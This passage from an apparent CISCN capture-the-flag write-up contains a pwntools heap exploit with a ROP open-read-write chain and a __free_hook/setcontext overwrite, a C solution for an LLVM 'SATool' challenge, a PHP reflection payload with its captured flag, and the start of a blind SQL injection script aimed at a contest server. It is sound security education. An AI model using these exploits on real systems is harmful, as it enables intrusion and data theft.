&lt;span class=&#34;n&#34;&gt;Open&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;read&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;syscall&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;FLAG&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xA0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x88&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FLAG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rax_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdx_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;###################&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3F0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3F0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x01&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x38&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xA0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;./flag&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;setcontext&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;53&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;satool&#34;&gt;SATool&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// clang -emit-llvm -o test.bc -c code.c
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;run: 		call *0x2040F8()
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;stealkey:	0x204100 = *0x2040F8
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;takeaway:	clear the 0x2040F8
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;save(char *s1,char *s2):
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;	memcpy(&amp;amp;P[0],s1,strlen(s1));
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;	memcpy(&amp;amp;P[1],s2,strlen(s2));
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;fakekey:	set *0x2040F8 = 0x204100 + SetEXTValue
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;B4ckDo0r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;FMYY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;stealkey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;fakekey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2E1884&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
	
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fakekey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;int64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;takeaway&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;B4ckDo0r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
&lt;h3 id=&#34;easy_source&#34;&gt;easy_source&lt;/h3&gt;
&lt;p&gt;原题，&lt;code&gt;ReflectionMethod&lt;/code&gt; 构造 &lt;code&gt;User&lt;/code&gt; 类中的函数方法，再通过 &lt;code&gt;getDocComment&lt;/code&gt; 获取函数的注释&lt;/p&gt;
&lt;p&gt;提交参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?rc=ReflectionMethod&amp;amp;ra=User&amp;amp;rb=a&amp;amp;rd=getDocComment
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆破rb的值a-z，在q得到flag：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210515122304432.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;CISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-}&lt;/p&gt;
&lt;h3 id=&#34;easy_sql&#34;&gt;easy_sql&lt;/h3&gt;
&lt;p&gt;fuzz：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-bansdasdsads.png&#34; alt=&#34;image-bansdasdsads&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;sqlmap得到表名flag和一个列名id：报错加无列名注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210515130056447.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;一开始用按位比较：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://124.70.35.238:23511/&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
